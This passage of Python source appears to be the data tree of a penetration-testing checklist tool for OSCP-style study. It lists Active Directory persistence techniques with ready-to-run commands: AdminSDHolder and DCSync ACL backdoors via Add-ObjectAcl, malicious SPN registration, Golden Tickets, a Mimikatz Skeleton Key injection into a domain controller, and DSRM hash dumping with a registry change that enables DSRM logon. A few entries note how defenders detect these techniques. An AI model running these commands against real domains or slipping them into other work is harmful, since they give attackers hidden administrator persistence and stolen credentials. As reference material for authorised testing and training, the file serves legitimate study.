                        'tags': ['OSCP:LOW', 'PERSISTENCE', 'ADVANCED'],
                        'alternatives': [
                            'Add-ObjectAcl -TargetADSprefix "CN=AdminSDHolder,CN=System" -PrincipalSamAccountName user -Rights All',
                            'Permissions propagate to protected groups every 60 minutes',
                            'Survives password changes and group removals',
                            'Detection: Monitor AdminSDHolder ACL changes'
                        ],
                        'notes': 'Extremely stealthy. User gets DA permissions without being in DA group. SDProp task propagates ACLs hourly'
                    }
                },
                # ACL-based Persistence
                {
                    'id': 'acl-persistence',
                    'name': 'ACL-based Persistence',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'acl-grant-dcsync',
                            'name': 'Grant DCSync Rights (WriteDacl)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Grant low-privilege user DCSync rights for persistent access',
                                'tags': ['PERSISTENCE', 'ACL'],
                                'alternatives': [
                                    'Add-ObjectAcl -TargetDistinguishedName "DC=domain,DC=local" -PrincipalSamAccountName lowpriv -Rights DCSync',
                                    'Requires DA or WriteDacl on domain object',
                                    'User can DCSync without being DA'
                                ]
                            }
                        },
                        {
                            'id': 'acl-grant-genericall',
                            'name': 'Grant GenericAll on Admin User',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Grant GenericAll over admin account for password reset capability',
                                'tags': ['PERSISTENCE', 'ACL'],
                                'alternatives': [
                                    'Add-ObjectAcl -TargetSamAccountName admin_user -PrincipalSamAccountName lowpriv -Rights All',
                                    'Can reset admin password anytime',
                                    'Targeted Kerberoast if needed'
                                ]
                            }
                        }
                    ]
                },
                # Golden Ticket Persistence
                {
                    'id': 'golden-ticket-persistence',
                    'name': 'Golden Ticket (Long-term)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Pre-forge Golden Tickets with extended lifetime for persistent access',
                        'tags': ['PERSISTENCE', 'KERBEROS'],
                        'alternatives': [
                            'Extract krbtgt hash (never rotates by default)',
                            'Create tickets offline anytime (no network needed)',
                            'Can impersonate any user, including non-existent ones',
                            'krbtgt password rarely changed (manual process)'
                        ],
                        'notes': 'Most powerful persistence. Requires initial DA for krbtgt extraction. Survives most remediation unless krbtgt rotated twice'
                    }
                },
                # SPN Persistence
                {
                    'id': 'spn-persistence',
                    'name': 'Malicious SPN Registration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Add fake SPN to controlled user for persistent Kerberoasting',
                        'tags': ['PERSISTENCE', 'KERBEROS'],
                        'alternatives': [
                            'Set-DomainObject -Identity user -Set @{serviceprincipalname=\'fake/service123\'}',
                            'Can Kerberoast own account anytime',
                            'Useful if account has high privileges',
                            'Cleanup: Set-DomainObject -Identity user -Clear serviceprincipalname'
                        ],
                        'notes': 'Low-profile persistence. SPN addition generates Event ID 5136'
                    }
                },
                # Skeleton Key
                {
                    'id': 'skeleton-key',
                    'name': 'Skeleton Key Attack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inject malicious key into DC LSASS for master password backdoor',
                        'tags': ['OSCP:LOW', 'PERSISTENCE', 'ADVANCED'],
                        'alternatives': [
                            'Invoke-Mimikatz -Command \'"privilege::debug" "misc::skeleton"\'',
                            'Master password works for all users: "mimikatz"',
                            'Requires DA and DC access',
                            'Cleared on DC reboot'
                        ],
                        'notes': 'Very noisy. Easy to detect. Not practical for OSCP. Requires kernel-level DC compromise'
                    }
                },
                # DSRM Backdoor
                {
                    'id': 'dsrm-backdoor',
                    'name': 'DSRM Credential Backdoor',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract and abuse Directory Services Restore Mode local admin',
                        'tags': ['OSCP:LOW', 'PERSISTENCE'],
                        'alternatives': [
                            'Dump DSRM hash: Invoke-Mimikatz -Command \'"token::elevate" "lsadump::sam"\'',
                            'Change behavior: Set-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name DsrmAdminLogonBehavior -Value 2',
                            'PTH with DSRM: Pass-the-Hash with extracted hash',
                            'Local account on DC (not domain)'
                        ],
                        'notes': 'DSRM password set during DC promotion, rarely changed. Requires DC compromise'
                    }
                }
            ]
        }
